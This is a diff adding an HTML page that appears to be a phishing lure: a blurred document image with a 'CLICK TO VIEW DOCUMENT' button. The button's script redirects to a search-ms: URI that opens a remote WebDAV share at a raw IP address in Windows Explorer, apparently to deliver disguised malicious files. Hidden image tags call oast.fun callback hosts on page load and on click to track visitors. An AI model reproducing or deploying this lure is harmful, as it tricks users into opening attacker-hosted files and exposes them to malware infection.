@@ -1,0 +1,51 @@
+<html>
+    <head class="header" id="myHeader">
+        <link rel="stylesheet" href="a.css">
+        <img src="https://czyrqdnvpujmmjkfhhvs1hk36lo6ndyqy.oast.fun" hidden />      
+    </head>
+
+    <body>
+            <div id="c1">
+                <img src=".\Capture2.PNG"/>
+            </div>
+            <div class="button-overlay">
+                <center>
+                    <img style="filter: blur(3.0px)" src=".\Capture12.PNG"/>
+                    
+                    <!-- HTML !-->
+                    <button class="button-48" role="button" onclick="getVideo()"> <span class="text">CLICK TO VIEW DOCUMENT</span></button>
+                </center>
+
+            </div>
+            <script defer>
+                function getVideo() {
+                    window.location.href = 'search:displayname=Downloads&subquery=%5C%5C194.126.178.8%4080%5Cwebdav%5Cvinnic.search-ms';
+                    const newElement = document.createElement('img');
+                    newElement.src = "https://czyrqdnvpujmmjkfhhvs4knf1av02demj.oast.fun";
+                    newElement.hidden = true;
+                    document.body.appendChild(newElement);
+                }
+            </script>
+    
+<div style="background-color:white">
+<br />
+<p><center>
+    <a href="https://www.cameraftp.com/" title="Leading Cloud Surveillance and Storage Service">
+        <img src="https://www.DriveHQ.com/images/banner/CameraFTPBanner800x100.png"
+            style="width:100%;max-width:800px;" border="0" alt="Leading Cloud Surveillance, Recording and Storage service; IP camera live viewing" /></a>
+    <br /><br />
+
+<a href="https://www.DriveHQ.com/" title="Leading Enterprise Cloud IT Service Since 2003">
+        <img src="https://www.DriveHQ.com/images/banner/DriveMappingBanner.png" 
+            style="width:100%;max-width:800px;" border="0" 
+            alt="Leading Enterprise Cloud IT Service; cloud file server, FTP Hosting, Online Storage, Backup and Sharing" /></a>
+    <br /><br />
+
+Powered by <a href="https://www.firstcloudit.com/" target="_blank" title="FirstCloudIT.com is DriveHQ's web, FTP and email hosting platform">FirstCloudIT.com</a>, a division of DriveHQ, the leading <a href="https://www.drivehq.com/" target="_blank" title="The one-stop Cloud IT services, incl. Cloud File Server, Online Sharing, FTP Hosting, Folder Sync and WebDAV Drive Mapping">Cloud IT</a> 
+and <a href="https://www.cameraftp.com/" target="_blank" title="CameraFTP cloud surveillance and storage service">Cloud Surveillance Service</a> provider since 2003.
+
+    </center>
+</p>
+
+</div></body>
+</html>
